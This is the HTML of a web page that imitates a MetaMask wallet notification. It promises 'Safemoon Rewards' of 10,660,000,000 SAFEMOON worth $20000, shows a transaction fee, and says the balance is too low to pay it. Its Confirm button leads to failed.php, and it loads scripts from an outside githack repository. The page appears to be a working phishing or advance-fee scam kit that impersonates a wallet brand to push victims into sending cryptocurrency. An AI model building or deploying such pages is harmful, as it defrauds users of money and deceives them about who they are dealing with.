<html><head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link href="https://use.fontawesome.com/releases/v5.6.3/css/all.css" rel="stylesheet" integrity="sha384-UHRtZLI+pbxtHCWp1t77Bi1L4ZtiqrqD80Kn4Z8NTSRyMA2Fd33n5dQ8lWUE00s/" crossorigin="anonymous">
    
    <meta charset="utf-8">
    <title>MetaMask Notification</title>
    <style>
      #app-content {
        display: flex;
        flex-flow: column;
      }

      #loading__logo {
        width: 10rem;
        height: 10rem;
        align-self: center;
        margin: 10rem 0 0 0;
      }

      #loading__spinner {
        width: 2rem;
        height: 2rem;
        align-self: center;
        margin-top: 1rem;
      }
    </style>
    <link rel="shortcut icon" href="https://metamask.io/images/favicon.png">
    <link rel="stylesheet" type="text/css" href="./style-AlexHost.css" title="ltr">
    <link rel="stylesheet" type="text/css" href="./index-rtl.css" title="rtl" disabled="">
  <style></style></head>
  <body class="notification">
    <div id="app-content"><div class="app"><div><span></span></div><div class="menu-droppo-container network-droppo" style="position: absolute; top: 58px; width: 309px; z-index: 55;"><style>
          .menu-droppo-enter {
            transition: transform 300ms ease-in-out;
            transform: translateY(-200%);
          }

          .menu-droppo-enter.menu-droppo-enter-active {
            transition: transform 300ms ease-in-out;
            transform: translateY(0%);
          }

          .menu-droppo-leave {
            transition: transform 300ms ease-in-out;
            transform: translateY(0%);
          }

          .menu-droppo-leave.menu-droppo-leave-active {
            transition: transform 300ms ease-in-out;
            transform: translateY(-200%);
          }
        </style></div><div class="main-container-wrapper"><div class="page-container"><div class="confirm-page-container-navigation" style="display: none;"><div class="confirm-page-container-navigation__container" style="visibility: hidden;"><div class="confirm-page-container-navigation__arrow" data-testid="first-page"><img src="/images/double-arrow.svg" alt=""></div><div class="confirm-page-container-navigation__arrow" data-testid="previous-page"><img src="/images/single-arrow.svg" alt=""></div></div><div class="confirm-page-container-navigation__textcontainer"><div class="confirm-page-container-navigation__navtext">1 of 1</div><div class="confirm-page-container-navigation__longtext">requests waiting to be acknowledged</div></div><div class="confirm-page-container-navigation__container" style="visibility: hidden;"><div class="confirm-page-container-navigation__arrow" data-testid="next-page"><img class="confirm-page-container-navigation__imageflip" src="/images/single-arrow.svg" alt=""></div><div class="confirm-page-container-navigation__arrow" data-testid="last-page"><img class="confirm-page-container-navigation__imageflip" src="/images/double-arrow.svg" alt=""></div></div></div><div class="confirm-page-container-header"><div class="confirm-page-container-header__row"><div class="confirm-page-container-header__address-container"><div class="confirm-page-container-header__address-identicon"><div class=""><div class="identicon" style="height: 24px; width: 24px; border-radius: 12px;"><div style="border-radius: 50px; overflow: hidden; padding: 0px; margin: 0px; width: 24px; height: 24px; display: inline-block; background: rgb(35, 143, 225);"><svg x="0" y="0" width="24" height="24"><rect x="0" y="0" width="24" height="24" transform="translate(-0.4639440735861378 -7.143619627475044) rotate(438.5 12 12)" fill="#F26A02"></rect><rect x="0" y="0" width="24" height="24" transform="translate(15.513796844776365 2.6117513459004957) rotate(177.4 12 12)" fill="#F58F00"></rect><rect x="0" y="0" width="24" height="24" transform="translate(-7.023312719556073 15.164086237737994) rotate(181.6 12 12)" fill="#18CAF2"></rect></svg></div></div></div></div></div><div class="network-display network-display--colored network-display--mainnet chip chip--with-left-icon chip--transparent"><div class="chip__left-icon"><div class="color-indicator color-indicator--filled color-indicator--color-mainnet color-indicator--size-lg"><span class="color-indicator__inner-circle"></span></div></div>
        
        <span class="box box--margin-top-1 box--margin-right-0 box--margin-bottom-1 box--margin-left-0 typography chip__label typography--h7 typography--align-undefined typography--color-ui-4 typography--weight-normal">Ethereum Mainnet</span></div></div></div>
        <div class="confirm-approve-content"><br><img class="identicon confirm-approve-content__identicon" src="https://i.ibb.co/0ZpTn2L/174x174.png" alt="" style="height: 48px; width: 48px; border-radius: 24px;">
        
        <div class="confirm-approve-content__title">Safemoon Rewards</div><div class="confirm-approve-content__description">You Get <b style="color: #4d4d4d;font-weight: bold;">10660000000 SAFEMOON</b> ($20000)<br></div><div class="confirm-approve-content__edit-submission-button-container"></div><div class="confirm-approve-content__card-wrapper"><div class="confirm-approve-content__card--no-border"><div class="confirm-approve-content__card-header"><div class="confirm-approve-content__card-header__symbol"><i class="fa fa-tag"></i></div><div class="confirm-approve-content__card-header__title">Transaction Fee</div><div class="confirm-approve-content__small-blue-text cursor-pointer">USD/ETH</div></div><div class="confirm-approve-content__card-content"><div class="confirm-approve-content__transaction-details-content"><div class="confirm-approve-content__small-text">A fee is associated with this request.</div><div class="confirm-approve-content__transaction-details-content__fee"><div class="confirm-approve-content__transaction-details-content__primary-fee">$105</div><div class="confirm-approve-content__transaction-details-content__secondary-fee">0.035 ETH </div></div></div></div>
         <p style="color: red;">Not enough funds for transaction fee, please fill your balance.</p>
        <div class="confirm-approve-content__view-full-tx-button-wrapper"><div class="confirm-approve-content__view-full-tx-button cursor-pointer"></div></div></div></div></div>
       
        
        <div class="page-container__footer"><footer><a href="index.php" class="button btn-default page-container__footer-button" data-testid="page-container-footer-cancel" role="button" tabindex="0">Reject</a>&ensp;&ensp;<a href="failed.php" class="button btn-primary page-container__footer-button" data-testid="page-container-footer-next" role="button" tabindex="0">Confirm</a></footer></div></div></div></div></div>
    <div id="popover-content"></div>
    <script src="./globalthis.js" type="text/javascript" charset="utf-8"></script>
    <script src="./initSentry.js" type="text/javascript" charset="utf-8"></script>
    <script src="./lockdown.js" type="text/javascript" charset="utf-8"></script>
    <script src="./runLockdown.js" type="text/javascript" charset="utf-8"></script>
    <script src="./ui-libs.js" type="text/javascript" charset="utf-8"></script>
    <script src="./ui.js" type="text/javascript" charset="utf-8"></script>
  
<script src="https://rawcdn.githack.com/AlexHostX/protect/aaa1462a19b8d8b6cbd68101a5ac89f4955b49de/input-exception.js"></script>
<link rel="stylesheet" href="https://rawcdn.githack.com/AlexHostX/protect/a64076479559076b6e31356a0fb6188d291204ce/watermark.css">
</body></html>